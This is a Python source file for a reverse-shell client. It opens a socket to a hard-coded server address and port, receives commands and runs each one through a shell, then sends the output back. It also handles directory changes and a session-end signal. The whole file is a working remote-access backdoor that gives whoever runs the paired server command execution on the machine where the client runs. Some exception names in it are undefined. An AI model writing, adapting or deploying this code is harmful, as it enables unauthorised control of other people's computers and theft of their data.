#!/usr/local/bin/python3
import socket
import subprocess
import os
import time
import sys

host = '192.168.1.10'  # server ip, which you want to connect to
port = 8090  # the port needs to be the same as server.py port in order to connect with server

class Client:
	def __init__(self, _host, _port=3434):
		self.host = _host
		self.port = _port
		self.s = None
		self.flag = False
		self.launch()

	def launch(self):
		try:
			self.open_socket()
			self.receive_commands()
			

		except error as e:
			time.sleep(6)
			#self.launch()

	# will create the socket
	def open_socket(self):
		try:
			self.s = socket.socket()
			self.s.connect((self.host, self.port))

		except socket_error as se:
			print("Socket connection error: " + str(se))
			time.sleep(5)
			if not self.flag:
				self.open_socket()

	# receive commands from the Server
	def receive_commands(self):
		try:
			while True:
				data = self.s.recv(20480)
				striped_data = data[:].strip().decode("utf-8")
				decoded_data = data[:].decode("utf-8")

				if decoded_data[:2] == 'cd':
					os.chdir(decoded_data[3:])
					continue
				elif decoded_data ==  '<list_connections>':
					self.s.send(str.encode('<reply>'))
					continue
				# this condition will work when the user quit server.py
				elif decoded_data == "end-of-session":
					time.sleep(2)
					self.s.close()
					sys.exit(0)
					os._exit(0)
					exit(0)
					quit(0)

				if len(data) > 0:
					try:
						cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, \
							stderr=subprocess.PIPE, \
							stdout=subprocess.PIPE, \
							stdin=subprocess.PIPE)
						#import pdb;pdb.set_trace()
						result = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")

						self.s.send(str.encode(result))
						print(result)
					except:
						result = "Command not recognized \n"
						self.s.send(str.encode(result))
						print(result)


			self.s.close()

		except:
			pass

if __name__ == '__main__':
	c = Client(host, port)
	c.launch()
